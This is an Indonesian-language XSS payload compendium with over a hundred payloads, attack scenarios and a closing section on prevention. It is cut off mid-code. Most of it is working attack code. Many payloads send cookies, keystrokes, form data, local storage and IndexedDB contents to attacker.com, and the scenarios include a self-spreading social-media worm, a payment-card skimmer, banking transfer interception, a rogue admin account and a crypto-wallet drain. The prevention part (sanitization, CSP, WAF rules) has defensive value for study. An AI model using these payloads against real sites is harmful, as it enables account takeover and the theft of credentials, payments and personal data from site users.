# 100+ Payload XSS

## Daftar Isi
1. [Konsep Dasar XSS](#konsep-dasar-xss)
2. [Reflected XSS Payload (1-25)](#reflected-xss-payload-1-25)
3. [Stored XSS Payload (26-50)](#stored-xss-payload-26-50)
4. [DOM-Based XSS Payload (51-75)](#dom-based-xss-payload-51-75)
5. [Advanced & Polyglot Payload (76-100)](#advanced--polyglot-payload-76-100)
6. [Real-World Attack Scenarios](#real-world-attack-scenarios)
7. [Prevention & Mitigation](#prevention--mitigation)

---

## Konsep Dasar XSS

### Apa itu XSS?
**Cross-Site Scripting (XSS)** adalah kerentanan keamanan web yang memungkinkan penyerang menyuntikkan kode JavaScript berbahaya ke halaman web yang kemudian dieksekusi di browser korban.

### Tipe-Tipe XSS:

#### 1. **Reflected XSS** (Non-Persistent)
- Payload dikirim melalui request (URL, form)
- Langsung dirender di response
- Contoh: `https://target.com/search?q=<script>alert(1)</script>`

#### 2. **Stored XSS** (Persistent)
- Payload disimpan di server (database)
- Dieksekusi setiap kali halaman diakses
- Contoh: Komentar, profil user, forum posts

#### 3. **DOM-Based XSS**
- Payload memanipulasi Document Object Model
- Tidak melibatkan server-side processing
- Contoh: `document.location.hash`, `eval()`

---

## Reflected XSS Payload (1-25)

### 1. Basic Script Tag
```html
<script>alert('XSS')</script>
```
**Penjelasan Detail:**
- **`<script>`**: Tag HTML untuk eksekusi JavaScript
- **`alert('XSS')`**: Function JavaScript untuk popup dialog
- **Cara kerja**: Browser menginterpretasi tag `<script>` dan mengeksekusi kontennya

**Implementasi:**
```html
<!-- Vulnerable code -->
<input type="text" value="<?php echo $_GET['input']; ?>">

<!-- Attack URL -->
https://target.com/page?input=<script>alert('XSS')</script>

<!-- Hasil di browser -->
<input type="text" value="<script>alert('XSS')</script>">
<!-- Browser execute script -->
```

### 2. Image Tag dengan onerror
```html
<img src="x" onerror="alert('XSS')">
```
**Penjelasan Detail:**
- **`<img>`**: Tag untuk gambar
- **`src="x"`**: URL gambar tidak valid
- **`onerror`**: Event handler yang dieksekusi ketika gambar gagal load
- **Mengapa "x"?**: Bisa string apapun yang bukan URL gambar valid

**Mekanisme:**
1. Browser mencoba load gambar dari `src="x"`
2. Karena URL invalid, terjadi error
3. Event `onerror` terpicu
4. JavaScript `alert('XSS')` dieksekusi

### 3. SVG dengan onload
```html
<svg onload="alert('XSS')">
```
**Penjelasan Detail:**
- **`<svg>`**: Scalable Vector Graphics (XML-based)
- **`onload`**: Event handler saat elemen selesai dimuat
- **Keunggulan**: SVG sering diizinkan di upload gambar

### 4. Body onload
```html
<body onload="alert(document.cookie)">
```
**Penjelasan Detail:**
- **`<body>`**: Tag utama HTML body
- **`document.cookie`**: Mengakses cookies pengguna
- **Skala besar**: Memengaruhi seluruh halaman

### 5. Input dengan autofocus
```html
<input type="text" onfocus="alert('XSS')" autofocus>
```
**Penjelasan Detail:**
- **`autofocus`**: Secara otomatis fokus ke elemen
- **`onfocus`**: Event saat elemen mendapat fokus
- **Trigger otomatis**: Tidak butuh interaksi user

### 6. Iframe dengan javascript URI
```html
<iframe src="javascript:alert('XSS')">
```
**Penjelasan Detail:**
- **`javascript:`**: Protocol untuk eksekusi JavaScript
- **Dalam iframe**: Membuat konteks eksekusi terpisah
- **URI scheme**: Bekerja di atribut yang menerima URL

### 7. Anchor Tag dengan javascript
```html
<a href="javascript:alert('XSS')">Click me</a>
```
**Penjelasan Detail:**
- Target: User mengklik link
- Social engineering: Link terlihat normal

### 8. Form dengan formaction
```html
<form><button formaction="javascript:alert('XSS')">Submit</button></form>
```

### 9. Details Tag HTML5
```html
<details open ontoggle="alert('XSS')">
  <summary>Click me</summary>
</details>
```

### 10. Video Source onerror
```html
<video><source onerror="alert('XSS')"></video>
```

### 11. Audio Tag
```html
<audio src=x onerror="alert('XSS')">
```

### 12. Marquee (Deprecated)
```html
<marquee onstart="alert('XSS')">test</marquee>
```

### 13. Object Tag
```html
<object data="x" onerror="alert('XSS')">
```

### 14. Embed Tag
```html
<embed src="javascript:alert('XSS')">
```

### 15. Base Tag Manipulation
```html
<base href="javascript:alert('XSS')//">
```

### 16. Meta Refresh
```html
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
```

### 17. Link Tag
```html
<link rel="import" href="javascript:alert('XSS')">
```

### 18. Using Style Tag
```html
<style>@import 'javascript:alert("XSS")';</style>
```

### 19. CSS Expression (IE)
```html
<div style="color:expression(alert('XSS'))">
```

### 20. Using background-image
```html
<div style="background:url('javascript:alert(\"XSS\")')">
```

### 21. Using @import dalam CSS
```html
<style>@import 'http://evil.com/xss.css';</style>
```

### 22. Using data: URI
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

### 23. Using VML (IE)
```html
<v:rect style="width:100px;height:100px" onmouseover="alert('XSS')"></v:rect>
```

### 24. Using MathML
```html
<math><mi//onclick="alert('XSS')">click
```

### 25. Using XML Namespace
```html
<xml:namespace prefix="t"/><t:xss xmlns:t="javascript:alert('XSS')">
```

---

## Stored XSS Payload (26-50)

### 26. Basic Stored XSS
```html
<script>alert(document.domain)</script>
```
**Penjelasan Detail:**
- **Stored**: Disimpan di database
- **Setiap akses**: Dieksekusi untuk semua user
- **Impact tinggi**: Bisa affect ribuan user

**Contoh Implementasi:**
```html
<!-- Komentar section -->
<textarea name="comment">User bisa input di sini</textarea>

<!-- User input: -->
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- Disimpan di database, ditampilkan ke semua user -->
```

### 27. Cookie Theft dengan Image
```html
<script>
new Image().src = 'https://attacker.com/collect?cookie=' + document.cookie;
</script>
```
**Penjelasan Detail:**
- **`new Image()`**: Membuat elemen gambar
- **`.src`**: Setting source trigger HTTP request
- **Stealth**: Tidak terlihat oleh user

### 28. Keylogger Sederhana
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + encodeURIComponent(e.key));
});
</script>
```

### 29. Form Hijacking
```html
<script>
document.forms[0].addEventListener('submit', function(e) {
  e.preventDefault();
  var data = new FormData(this);
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: data
  }).then(() => this.submit());
});
</script>
```

### 30. Session Hijacking
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/hijack', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('session=' + encodeURIComponent(document.cookie));
</script>
```

### 31. Redirect User
```html
<script>
window.location = 'https://phishing-site.com';
// atau
document.location.href = 'https://attacker.com';
</script>
```

### 32. Defacement Halaman
```html
<script>
document.body.innerHTML = '<h1>HACKED</h1><p>This site has been compromised</p>' + document.body.innerHTML;
document.body.style.backgroundColor = 'red';
</script>
```

### 33. Create Fake Login Form
```html
<script>
var fakeForm = document.createElement('div');
fakeForm.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
      <h2>Session Expired</h2>
      <p>Please re-enter your credentials:</p>
      <input type="text" id="username" placeholder="Username"><br>
      <input type="password" id="password" placeholder="Password"><br>
      <button onclick="submitCreds()">Login</button>
    </div>
  </div>
`;
document.body.appendChild(fakeForm);

function submitCreds() {
  var user = document.getElementById('username').value;
  var pass = document.getElementById('password').value;
  fetch('https://attacker.com/steal?user='+user+'&pass='+pass);
  fakeForm.remove();
}
</script>
```

### 34. Cryptojacking
```html
<script>
// CoinHive mining script (contoh)
var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
miner.start();
</script>
```

### 35. Browser Fingerprinting
```html
<script>
var fingerprint = {
  userAgent: navigator.userAgent,
  language: navigator.language,
  platform: navigator.platform,
  cookies: navigator.cookieEnabled,
  screen: screen.width + 'x' + screen.height,
  plugins: Array.from(navigator.plugins).map(p => p.name),
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
};
fetch('https://attacker.com/fingerprint', {
  method: 'POST',
  body: JSON.stringify(fingerprint)
});
</script>
```

### 36. Webcam/Microphone Access
```html
<script>
navigator.mediaDevices.getUserMedia({video: true, audio: true})
  .then(stream => {
    // Stream bisa dikirim ke attacker server
  })
  .catch(err => console.error(err));
</script>
```

### 37. Geolocation Theft
```html
<script>
navigator.geolocation.getCurrentPosition(position => {
  fetch('https://attacker.com/locate?lat=' + position.coords.latitude + 
        '&lon=' + position.coords.longitude);
});
</script>
```

### 38. Clipboard Theft
```html
<script>
navigator.clipboard.readText().then(text => {
  fetch('https://attacker.com/clipboard?data=' + encodeURIComponent(text));
});
</script>
```

### 39. LocalStorage Theft
```html
<script>
var allData = {};
for (var i = 0; i < localStorage.length; i++) {
  var key = localStorage.key(i);
  allData[key] = localStorage.getItem(key);
}
fetch('https://attacker.com/localstorage', {
  method: 'POST',
  body: JSON.stringify(allData)
});
</script>
```

### 40. SessionStorage Theft
```html
<script>
var sessionData = {};
for (var i = 0; i < sessionStorage.length; i++) {
  var key = sessionStorage.key(i);
  sessionData[key] = sessionStorage.getItem(key);
}
fetch('https://attacker.com/session', {
  method: 'POST',
  body: JSON.stringify(sessionData)
});
</script>
```

### 41. Password Manager Exploit
```html
<script>
// Membuat form tersembunyi untuk trigger autofill
var hiddenForm = document.createElement('form');
hiddenForm.innerHTML = `
  <input type="text" name="username" style="display:none">
  <input type="password" name="password" style="display:none">
`;
document.body.appendChild(hiddenForm);

// Capture autofilled values
setTimeout(() => {
  var username = hiddenForm.username.value;
  var password = hiddenForm.password.value;
  if (username && password) {
    fetch('https://attacker.com/creds?user='+username+'&pass='+password);
  }
}, 1000);
</script>
```

### 42. CSRF Token Theft
```html
<script>
// Mencari CSRF token di halaman
var token = document.querySelector('input[name="csrf_token"]')?.value || 
            document.querySelector('meta[name="csrf-token"]')?.content;
if (token) {
  fetch('https://attacker.com/steal?csrf=' + token);
}
</script>
```

### 43. Auto-Follow/Subscribe
```html
<script>
// Otomatis follow user tertentu
fetch('/api/follow/attacker', {method: 'POST'});
// atau subscribe channel
fetch('/api/subscribe/evil-channel', {method: 'POST'});
</script>
```

### 44. Like/Upvote Bot
```html
<script>
// Otomatis like semua post
document.querySelectorAll('.like-button').forEach(btn => {
  btn.click();
});
</script>
```

### 45. Comment Spammer
```html
<script>
setInterval(() => {
  fetch('/api/comment', {
    method: 'POST',
    body: 'message=Hacked by XSS&post_id=123'
  });
}, 5000); // Setiap 5 detik
</script>
```

### 46. Profile Takeover
```html
<script>
// Ubah profile user
fetch('/api/profile/update', {
  method: 'POST',
  body: 'name=HACKED&bio=This account has been compromised&avatar=http://evil.com/hacked.jpg'
});
</script>
```

### 47. Payment Redirect
```html
<script>
// Redirect payment ke attacker
document.querySelectorAll('a[href*="checkout"], button[onclick*="purchase"]').forEach(el => {
  el.onclick = function() {
    window.location = 'https://attacker.com/fake-checkout';
    return false;
  };
});
</script>
```

### 48. Newsletter Subscription
```html
<script>
// Subscribe user ke spam newsletter
fetch('/api/newsletter/subscribe', {
  method: 'POST',
  body: 'email=' + encodeURIComponent('user@example.com') + '&list=spam'
});
</script>
```

### 49. Password Change
```html
<script>
// Ubah password user
fetch('/api/change-password', {
  method: 'POST',
  body: 'current_pass=&new_pass=hacked123&confirm_pass=hacked123'
});
</script>
```

### 50. Account Deletion
```html
<script>
// Hapus akun user
if (confirm('Your account will be deleted. Continue?')) {
  fetch('/api/delete-account', {method: 'POST'});
}
</script>
```

---

## DOM-Based XSS Payload (51-75)

### 51. Location Hash Exploit
```html
<script>eval(location.hash.substring(1))</script>
```
**Penjelasan Detail:**
- **`location.hash`**: Bagian setelah # dalam URL
- **`substring(1)`**: Hapus karakter #
- **`eval()`**: Mengeksekusi string sebagai JavaScript
- **URL**: `https://target.com/page#alert('XSS')`

### 52. document.write() Vulnerability
```html
<script>document.write('<img src=x onerror=alert(1)>')</script>
```

### 53. innerHTML Manipulation
```html
<script>document.getElementById('content').innerHTML = '<script>alert(1)</script>';</script>
```

### 54. outerHTML Manipulation
```html
<script>document.body.outerHTML = '<body onload=alert(1)>';</script>
```

### 55. Using eval() dengan Input
```html
<script>eval(document.getElementById('input').value);</script>
```

### 56. setTimeout dengan String
```html
<script>setTimeout("alert('XSS')", 1000);</script>
```

### 57. setInterval dengan String
```html
<script>setInterval("alert('XSS')", 1000);</script>
```

### 58. Function Constructor
```html
<script>new Function('alert("XSS")')();</script>
```

### 59. Using import()
```html
<script>import('data:text/javascript,alert("XSS")');</script>
```

### 60. Using location
```html
<script>location = 'javascript:alert(document.domain)';</script>
```

### 61. Using window.name
```html
<script>
window.name = '<script>alert(1)</script>';
eval(window.name);
</script>
```

### 62. postMessage Exploit
```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
// Parent window bisa kirim: postMessage("alert('XSS')", "*")
</script>
```

### 63. JSON.parse dengan Constructor
```html
<script>
var obj = JSON.parse('{"__proto__": {"isAdmin": true}}');
// Prototype pollution
</script>
```

### 64. Using with Statement
```html
<script>
with(document) {
  write('<script>alert(1)</script>');
}
</script>
```

### 65. Using Object.constructor
```html
<script>
''.constructor.constructor('alert("XSS")')();
</script>
```

### 66. Using importScripts
```html
<script>
importScripts('data:text/javascript,alert("XSS")');
</script>
```

### 67. Using document.domain
```html
<script>
document.domain = document.domain;
// Bisa trigger beberapa behaviors
</script>
```

### 68. SVG in DOM
```html
<svg><script>alert('XSS')</script></svg>
```

### 69. Using currentScript
```html
<script>
alert(document.currentScript.parentNode.innerHTML);
</script>
```

### 70. DOM Clobbering
```html
<form id="xss"><input name="innerHTML" value="<img src=x onerror=alert(1)>"></form>
<script>alert(xss.innerHTML);</script>
```

### 71. Using name attribute
```html
<iframe name="alert(1)"></iframe>
<script>window[window.name]();</script>
```

### 72. Using referrer
```html
<script>
if (document.referrer.indexOf('xss') > -1) {
  eval(document.referrer.split('xss=')[1]);
}
</script>
```

### 73. Cookie-based DOM XSS
```html
<script>
document.cookie = "xss=alert(1); path=/";
eval(document.cookie.split('xss=')[1].split(';')[0]);
</script>
```

### 74. LocalStorage DOM XSS
```html
<script>
localStorage.setItem('xss', 'alert(1)');
eval(localStorage.getItem('xss'));
</script>
```

### 75. SessionStorage DOM XSS
```html
<script>
sessionStorage.setItem('xss', 'alert(1)');
eval(sessionStorage.getItem('xss'));
</script>
```

---

## Advanced & Polyglot Payload (76-100)

### 76. Polyglot Universal
```javascript
javascript:/*--></title></style></textarea></script></xmp></svg></noscript></iframe></noembed></noframes></template></select></math></form></body></html>--><img src=x onerror=alert('XSS')>
```
**Penjelasan Detail:**
- **Polyglot**: Bekerja di multiple contexts
- **Menutup berbagai tag**: `</title>`, `</style>`, dll
- **Bypass**: Filter yang hanya cek konteks tertentu

### 77. SVG Polyglot
```html
<svg><script>alert('XSS')</script></svg>
<svg/onload=alert('XSS')>
```

### 78. MathML + HTML + SVG
```html
<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>
```

### 79. UTF-7 Bypass
```html
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
```
**Penjelasan**: UTF-7 encoded, bypass filter yang tidak decode UTF-7

### 80. UTF-16 Bypass
```html
<script>\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053')</script>
```

### 81. Hex Encoding
```html
<script>alert('\x58\x53\x53')</script>
```

### 82. Octal Encoding
```html
<script>alert('\130\123\123')</script>
```

### 83. HTML Entities
```html
<script>alert(&#39;XSS&#39;)</script>
```

### 84. URL Encoding
```html
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

### 85. Double URL Encoding
```html
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
```

### 86. Base64 Encoding
```html
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

### 87. JavaScript Obfuscation
```html
<script>
var _0xa=["\x61\x6C\x65\x72\x74","\x58\x53\x53"];
window[_0xa[0]](_0xa[1]);
</script>
```

### 88. Using fromCharCode
```html
<script>alert(String.fromCharCode(88,83,83))</script>
```

### 89. Using concat
```html
<script>alert('X'.concat('S','S'))</script>
```

### 90. Template Literals
```html
<script>alert`XSS`</script>
<img src=x onerror=alert`XSS`>
```

### 91. Using backticks
```html
<img src=`x` onerror=`alert('XSS')`>
```

### 92. No Parentheses
```html
<script>alert`XSS`</script>
<script>throw onerror=alert,1337</script>
```

### 93. Using location
```html
<script>location='javascript:alert\x28\x27XSS\x27\x29'</script>
```

### 94. Using document.write
```html
<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,88,83,83,39,41,60,47,115,99,114,105,112,116,62))</script>
```

### 95. Mutation XSS (mXSS)
```html
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
```
**Penjelasan**: Memanfaatkan perbedaan parsing browser

### 96. Using <textarea>
```html
<textarea><script>alert('XSS')</script></textarea>
```

### 97. Using <title>
```html
</title><script>alert('XSS')</script>
```

### 98. Using <style>
```html
</style><script>alert('XSS')</script>
```

### 99. Using <!--
```html
<!--<script>alert('XSS')</script>-->
```

### 100. CDATA Bypass
```html
<![CDATA[<]]>script>alert('XSS')</script>
```

### BONUS: Advanced Payload

#### 101. WebSocket Hijacking
```html
<script>
var ws = new WebSocket('ws://attacker.com:8080/');
ws.onopen = function() {
  ws.send('Cookie: ' + document.cookie);
  ws.send('LocalStorage: ' + JSON.stringify(localStorage));
};
</script>
```

#### 102. Beacon API for Data Exfiltration
```html
<script>
navigator.sendBeacon('https://attacker.com/collect', 
  'data=' + encodeURIComponent(document.cookie + '|' + localStorage.length));
</script>
```

#### 103. Service Worker Hijacking
```html
<script>
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('https://attacker.com/sw.js');
}
</script>
```

#### 104. IndexedDB Exfiltration
```html
<script>
var req = indexedDB.open('databaseName');
req.onsuccess = function(e) {
  var db = e.target.result;
  var tx = db.transaction(['storeName'], 'readonly');
  var store = tx.objectStore('storeName');
  var allData = [];
  
  store.openCursor().onsuccess = function(e) {
    var cursor = e.target.result;
    if (cursor) {
      allData.push(cursor.value);
      cursor.continue();
    } else {
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(allData)
      });
    }
  };
};
</script>
```

#### 105. Clipboard Injection
```html
<script>
navigator.clipboard.writeText('Malicious text with link: http://evil.com');
</script>
```

---

## Real-World Attack Scenarios

### Scenario 1: Social Media XSS Worm
```html
<script>
// Worm yang menyebar sendiri
var payload = '<script>var x=new Image;x.src="http://attacker.com/steal?cookie="+document.cookie;' +
              'fetch("/api/post",{method:"POST",body:"content="+encodeURIComponent("<img src=x onerror=\\""+' +
              'atob("dmFyIHg9bmV3IEltYWdlO3guc3JjPSJodHRwOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTs=")+' +
              '\\"/>")});</script>';

// Post ke wall user
fetch('/api/post', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'content=' + encodeURIComponent(payload)
});

// Kirim ke friends
fetch('/api/friends').then(r => r.json()).then(friends => {
  friends.forEach(friend => {
    fetch('/api/message', {
      method: 'POST',
      body: 'to=' + friend.id + '&message=' + encodeURIComponent('Check this out: ' + payload)
    });
  });
});
</script>
```

### Scenario 2: E-commerce Checkout Hijack
```html
<script>
// Intercept checkout process
var originalCheckout = window.checkout;
window.checkout = function() {
  // Steal payment info
  var card = document.getElementById('card-number').value;
  var expiry = document.getElementById('expiry-date').value;
  var cvv = document.getElementById('cvv').value;
  
  fetch('https://attacker.com/steal-payment', {
    method: 'POST',
    body: JSON.stringify({card: card, expiry: expiry, cvv: cvv})
  });
  
  // Continue with original checkout
  return originalCheckout.apply(this, arguments);
};

// Also modify all links to checkout
document.querySelectorAll('a[href*="checkout"]').forEach(link => {
  link.href = 'https://attacker.com/fake-checkout';
});
</script>
```

### Scenario 3: Banking Session Hijack
```html
<script>
// Session hijacking untuk banking site
setInterval(() => {
  // Capture current balance
  var balance = document.querySelector('.balance')?.innerText;
  var account = document.querySelector('.account-number')?.innerText;
  
  if (balance && account) {
    fetch('https://attacker.com/banking-info', {
      method: 'POST',
      body: JSON.stringify({
        account: account,
        balance: balance,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
      })
    });
  }
  
  // Modify transfer forms
  document.querySelectorAll('form[action*="transfer"]').forEach(form => {
    var originalSubmit = form.onsubmit;
    form.onsubmit = function(e) {
      e.preventDefault();
      
      var toAccount = form.querySelector('[name="to_account"]').value;
      var amount = form.querySelector('[name="amount"]').value;
      
      // Send to attacker
      fetch('https://attacker.com/intercept-transfer', {
        method: 'POST',
        body: JSON.stringify({to: toAccount, amount: amount})
      });
      
      // Continue with original transfer
      if (originalSubmit) originalSubmit.call(this, e);
      else form.submit();
    };
  });
}, 5000); // Check setiap 5 detik
</script>
```

### Scenario 4: Admin Panel Takeover
```html
<script>
// Jika user adalah admin
if (document.body.innerHTML.includes('Admin Panel')) {
  // Buat admin user baru untuk attacker
  fetch('/admin/create-user', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    body: JSON.stringify({
      username: 'attacker_admin',
      password: 'P@ssw0rd123!',
      email: 'attacker@evil.com',
      role: 'super_admin'
    })
  });
  
  // Grant semua permissions
  fetch('/admin/grant-permissions', {
    method: 'POST',
    body: 'user_id=attacker_admin&permissions=all'
  });
  
  // Backup current data
  fetch('/admin/export-data').then(r => r.text()).then(data => {
    fetch('https://attacker.com/backup', {
      method: 'POST',
      body: data
    });
  });
}
</script>
```

### Scenario 5: Cryptocurrency Wallet Drain
```html
<script>
// Target: Crypto wallet web interface
if (window.ethereum || window.web3) {
  // Inject malicious JavaScript ke wallet context
  var script = document.createElement('script');
  script.textContent = `
    // Override sendTransaction
    var originalSend = web3.eth.sendTransaction;
    web3.eth.sendTransaction = function(tx) {
      // Send copy ke attacker wallet
      var maliciousTx = Object.assign({}, tx, {
        to: '0xAttackerWalletAddress'
      });
      
      // Kirim asli dan malicious
      Promise.all([
        originalSend.call(this, tx),
        originalSend.call(this, maliciousTx)
      ]);
    };
    
    // Monitor balances
    setInterval(() => {
      web3.eth.getAccounts().then(accounts => {
        accounts.forEach(account => {
          web3.eth.getBalance(account).then(balance => {
            fetch('https://attacker.com/wallet-info', {
              method: 'POST',
              body: JSON.stringify({
                account: account,
                balance: balance.toString(),
                network: web3.version.network
              })
            });
          });
        });
      });
    }, 30000);
  `;
  document.head.appendChild(script);
}
</script>
```

---

## Prevention & Mitigation

### 1. Input Validation & Sanitization

#### Whitelist Approach:
```php
// Hanya izinkan alphanumeric dan spasi
function sanitize_input($input) {
    return preg_replace('/[^a-zA-Z0-9\s]/', '', $input);
}

// Validasi URL
function validate_url($url) {
    $parsed = parse_url($url);
    $allowed_hosts = ['example.com', 'trusted-site.com'];
    
    if (!in_array($parsed['host'], $allowed_hosts)) {
        return false;
    }
    
    return filter_var($url, FILTER_VALIDATE_URL);
}
```

#### HTML Purifier (PHP):
```php
require_once 'HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_html = $purifier->purify($dirty_html);
```

### 2. Output Encoding

#### Context-Specific Encoding:
```php
// HTML Body Encoding
function encode_for_html($string) {
    return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// HTML Attribute Encoding
function encode_for_attribute($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8', false);
}

// JavaScript Encoding
function encode_for_javascript($string) {
    return json_encode($string, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
}

// URL Encoding
function encode_for_url($string) {
    return urlencode($string);
}

// CSS Encoding
function encode_for_css($string) {
    return preg_replace('/[^a-zA-Z0-9]/', '\\$0', $string);
}
```

### 3. Content Security Policy (CSP)

#### CSP Header Example:
```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://*.example.com;
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

#### CSP dengan Nonce:
```html
<!-- Server generate unique nonce setiap request -->
<?php $nonce = base64_encode(random_bytes(32)); ?>
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'nonce-<?= $nonce ?>'">

<!-- Hanya script dengan nonce yang valid dieksekusi -->
<script nonce="<?= $nonce ?>">
  // Legitimate script
</script>
```

#### CSP dengan Hash:
```html
<!-- Hash dari script content -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'sha256-abc123...'">

<script>
  // Script dengan hash yang sesuai
</script>
```

### 4. HTTP Security Headers

```http
# HSTS - Force HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# X-Frame-Options - Clickjacking protection
X-Frame-Options: DENY

# X-Content-Type-Options - MIME sniffing protection
X-Content-Type-Options: nosniff

# Referrer-Policy - Control referrer information
Referrer-Policy: strict-origin-when-cross-origin

# Permissions-Policy - Feature control
Permissions-Policy: 
  camera=(), 
  microphone=(), 
  geolocation=(), 
  payment=()
```

### 5. Secure Coding Practices

#### Safe DOM Manipulation:
```javascript
// UNSAFE
element.innerHTML = userControlledData;

// SAFE
element.textContent = userControlledData;

// Atau gunakan API yang aman
var safeDiv = document.createElement('div');
safeDiv.textContent = userControlledData;
element.appendChild(safeDiv);
```

#### Safe URL Handling:
```javascript
// UNSAFE
document.location = userInput;

// SAFE
var url = new URL(userInput, window.location.origin);
if (url.origin === window.location.origin) {
    document.location = url;
}
```

#### Safe JSON Parsing:
```javascript
// UNSAFE
var obj = eval('(' + jsonString + ')');

// SAFE
var obj = JSON.parse(jsonString);

// Dengan validation
function safeJsonParse(str) {
    try {
        var obj = JSON.parse(str);
        // Validate structure
        if (typeof obj !== 'object' || obj === null) {
            throw new Error('Invalid JSON structure');
        }
        return obj;
    } catch (e) {
        return null;
    }
}
```

### 6. Framework-Specific Protection

#### React:
```jsx
// Automatic escaping di JSX
function UserProfile({ username }) {
    // Aman secara default
    return <div>Hello, {username}</div>;
}

// DangerouslySetInnerHTML (gunakan dengan hati-hati)
function BlogPost({ content }) {
    return (
        <div 
            dangerouslySetInnerHTML={{
                __html: sanitizeHtml(content)  // Sanitize dulu!
            }} 
        />
    );
}
```

#### Vue.js:
```vue
<template>
  <!-- Automatic escaping -->
  <div>{{ userInput }}</div>
  
  <!-- v-html (hati-hati) -->
  <div v-html="sanitizedHtml"></div>
</template>

<script>
import sanitizeHtml from 'sanitize-html';

export default {
  data() {
    return {
      userInput: '',
      htmlContent: ''
    };
  },
  computed: {
    sanitizedHtml() {
      return sanitizeHtml(this.htmlContent);
    }
  }
};
</script>
```

#### Angular:
```typescript
import { Component } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-root',
  template: `
    <!-- Automatic escaping -->
    <div>{{ userInput }}</div>
    
    <!-- BypassSecurityTrustHtml -->
    <div [innerHTML]="safeHtml"></div>
  `
})
export class AppComponent {
  userInput: string;
  safeHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {
    this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(this.userInput);
  }
}
```

### 7. Regular Security Testing

#### Automated Scanning:
```bash
# OWASP ZAP
zap-baseline.py -t https://target.com

# Nuclei (template-based)
nuclei -u https://target.com -t xss.yaml

# XSStrike
python3 xsstrike.py -u "https://target.com/page?q=test"
```

#### Manual Testing Checklist:
```markdown
# XSS Testing Checklist

## Reflected XSS
- [ ] Test semua URL parameters
- [ ] Test POST parameters
- [ ] Test HTTP headers
- [ ] Test dengan berbagai encoding

## Stored XSS  
- [ ] Form submissions
- [ ] File uploads
- [ ] User profiles
- [ ] Comments/forum posts

## DOM XSS
- [ ] location.hash
- [ ] document.write()
- [ ] innerHTML/outerHTML
- [ ] eval()/setTimeout/setInterval
- [ ] JSON.parse()

## Bypass Testing
- [ ] WAF bypass techniques
- [ ] Encoding variations
- [ ] Polyglot payloads
- [ ] Case manipulation
```

#### Browser Developer Tools untuk Testing:
```javascript
// Console testing
console.log('Testing XSS payloads');

// Debug event handlers
getEventListeners(document);

// Monitor DOM changes
MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        console.log('DOM changed:', mutation);
    });
});
observer.observe(document, {subtree: true, childList: true});
```

### 8. Monitoring & Incident Response

#### XSS Detection Rules (WAF):
```nginx
# ModSecurity rules
SecRule ARGS "@detectXSS" \
    "id:101,phase:2,deny,status:403,msg:'XSS Attack Detected'"

SecRule REQUEST_URI|REQUEST_BODY "@rx <script>" \
    "id:102,phase:2,deny,status:403,msg:'Script Tag Detected'"

SecRule REQUEST_URI|REQUEST_BODY "@rx javascript:" \
    "id:103,phase:2,deny,status:403,msg:'JavaScript URI Detected'"
```

#### Log Monitoring:
```javascript
// Client-side monitoring
window.addEventListener('error', function(e) {
    fetch('/api/log-error', {
        method: 'POST',
        body: JSON.stringify({
            message: e.message,
            filename: e.filename,
            lineno: e.lineno,
            colno: e.colno,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        })
    });
});

// Monitor suspicious activity
var originalFetch = window.fetch;
window.fetch = function(url, options) {
    // Log semua external requests
    if (url.includes('//') && !url.includes(location.hostname)) {
        console.warn('External request:', url);
        
        // Send to monitoring
        fetch('/api/monitor/external-request', {
            method: 'POST',
            body: JSON.stringify({
                url: url,
                timestamp: new Date().toISOString()
            })
        });
